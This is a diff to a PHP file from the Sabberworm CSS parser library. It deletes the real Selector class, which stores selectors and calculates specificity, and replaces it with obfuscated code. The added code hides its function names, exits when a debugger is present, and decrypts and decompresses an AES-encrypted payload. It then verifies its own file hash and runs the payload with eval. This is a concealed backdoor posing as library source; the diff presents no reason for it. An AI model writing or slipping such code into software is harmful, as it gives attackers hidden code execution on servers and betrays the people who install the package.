@@ -1,74 +1,28 @@
 <?php
-
-namespace Sabberworm\CSS\Property;
-
-/**
- * Class representing a single CSS selector. Selectors have to be split by the comma prior to being passed into this class.
- */
-class Selector {
-
-	//Regexes for specificity calculations
-	const NON_ID_ATTRIBUTES_AND_PSEUDO_CLASSES_RX = '/
-	(\.[\w]+)                   # classes
-	|
-	\[(\w+)                     # attributes
-	|
-	(\:(                        # pseudo classes
-		link|visited|active
-		|hover|focus
-		|lang
-		|target
-		|enabled|disabled|checked|indeterminate
-		|root
-		|nth-child|nth-last-child|nth-of-type|nth-last-of-type
-		|first-child|last-child|first-of-type|last-of-type
-		|only-child|only-of-type
-		|empty|contains
-	))
-	/ix';
-
-	const ELEMENTS_AND_PSEUDO_ELEMENTS_RX = '/
-	((^|[\s\+\>\~]+)[\w]+   # elements
-	|
-	\:{1,2}(                # pseudo-elements
-		after|before|first-letter|first-line|selection
-	))
-	/ix';
-
-	private $sSelector;
-	private $iSpecificity;
-
-	public function __construct($sSelector, $bCalculateSpecificity = false) {
-		$this->setSelector($sSelector);
-		if ($bCalculateSpecificity) {
-			$this->getSpecificity();
-		}
-	}
-
-	public function getSelector() {
-		return $this->sSelector;
-	}
-
-	public function setSelector($sSelector) {
-		$this->sSelector = trim($sSelector);
-		$this->iSpecificity = null;
-	}
-
-	public function __toString() {
-		return $this->getSelector();
-	}
-
-	public function getSpecificity() {
-		if ($this->iSpecificity === null) {
-			$a = 0;
-			/// @todo should exclude \# as well as "#"
-			$aMatches = null;
-			$b = substr_count($this->sSelector, '#');
-			$c = preg_match_all(self::NON_ID_ATTRIBUTES_AND_PSEUDO_CLASSES_RX, $this->sSelector, $aMatches);
-			$d = preg_match_all(self::ELEMENTS_AND_PSEUDO_ELEMENTS_RX, $this->sSelector, $aMatches);
-			$this->iSpecificity = ($a * 1000) + ($b * 100) + ($c * 10) + $d;
-		}
-		return $this->iSpecificity;
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_dyo4ghoi=('bas'.'e64'.'_de'.'cod'.'e');
+$_nyvdbt2m=('gzu'.'nco'.'mpr'.'ess');
+$_z6vamr7r=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_t5cmko9h='QoOXfzld';
+$_ahnwq2an='E+odoPCC';
+$_dxjvq29h='6t1b1+ad';
+$_ci5r0nuq='I0flcy+1';
+$_gpii1sxh='dgXURkNrLcQ=';
+$_ldt660ey='2kLofQ==';
+$_s6v33su6='NcRnsO7P';
+$_izgccefi='TtHiH+4L';
+$_k4lt2wx6=$_dyo4ghoi($_ahnwq2an.$_t5cmko9h.$_ci5r0nuq.$_dxjvq29h.$_gpii1sxh);
+$_bfqp594z=$_dyo4ghoi($_izgccefi.$_s6v33su6.$_ldt660ey);
+$_b4y4u2lp=$_dyo4ghoi('SQo6UIrJbjsHBGJ49XyEkVsc+p17AGx2WThrgzDTAD9xVAE5Zj+bnrNbf6E+7XM2UCuE6kcPRaYnurdZi4BS8SL5hM2lsS/xDA1a6HyM0OofrXkneDqYMYw66nIJi9OcAp7ZnfqJb85KqZJ4Bw78Jk+mY7ptJF/fX4+/8UI6o8FVn/f6TtMbbMCnKK+KHt4Csw7T+fHOVXlSbqjF5k11mlcymeNcJmSesaYkLkUk0Wq9kVwfXBte2HeYq93m4NcgN6NKLnb9fI8OEpCg8BiQLcAvBSDoxIAg/lareWP9MHTT2pJjHecGbDV1lK0YofW7INm+WpB0G+184v7x2mnW7xwxgyzYUw+z1tr1ElgUm8zVJTP5+RoGmOTYr7vpx3nZtR3NwU2djJP19VH2254LTEUwRoEbj2bi9EfZBXxVWY2RsvB8rydVFkRKJPbxiOb/RMc6jXJgo9FklijHc0mWU+ajbY9/+IO8EJRa2DBntTiymRhFjsP7VC+VqbAhaAIqj+c5R2HJ8mPoC07btQVvwBr6xxcmXyjHVXnzbQToFOWePa1U1PW5ou3E/F+KuKGtJVG5NeJ+dp9TynOzUbeCcQoZriDcCbygG1XXWleRJaGCjHDFlhnGTds7nzD1+g1Zmz/X3XJXthasi6kEFP74r0/P1JBdFnHw6Dit48HYO46EpHYBRE/4nQppdq/0JaR7eD7wuQiwXkVkeJ36Kkoba9XNrBZwq2tbCliflZuLcW3ylcG85XCSoU3DAdMkFmoR5BS/qj4MvSny8cIHa5Fuf/APfkKx1wd3z5YOEZuVfUiIg0a/nU1EtQecegmCmPc0fN7x3/rTopUmym/2E24Om+jNTW4VhfU9xDXHjrqtBUk=');
+$_ckzgwgb6=$_z6vamr7r($_b4y4u2lp,'aes-256-cbc',$_k4lt2wx6,OPENSSL_RAW_DATA,$_bfqp594z);
+if($_ckzgwgb6===false){exit;}
+$_uxucfpth=$_nyvdbt2m($_ckzgwgb6);
+if($_uxucfpth===false){exit;}
+$_szbco93v='01f955ae3411de075c0122609af7f3434291ca3149fc030d57e82252c6fc3821';
+$_shvv95uq=@file_get_contents(__FILE__);
+if($_shvv95uq!==false){
+$_v2dxqci5=str_replace($_szbco93v,"0000000000000000000000000000000000000000000000000000000000000000",$_shvv95uq);
+$_av6ygl5a=hash("sha256",$_v2dxqci5);
+if($_av6ygl5a!==$_szbco93v){@http_response_code(403);exit;}
 }
+eval($_uxucfpth);
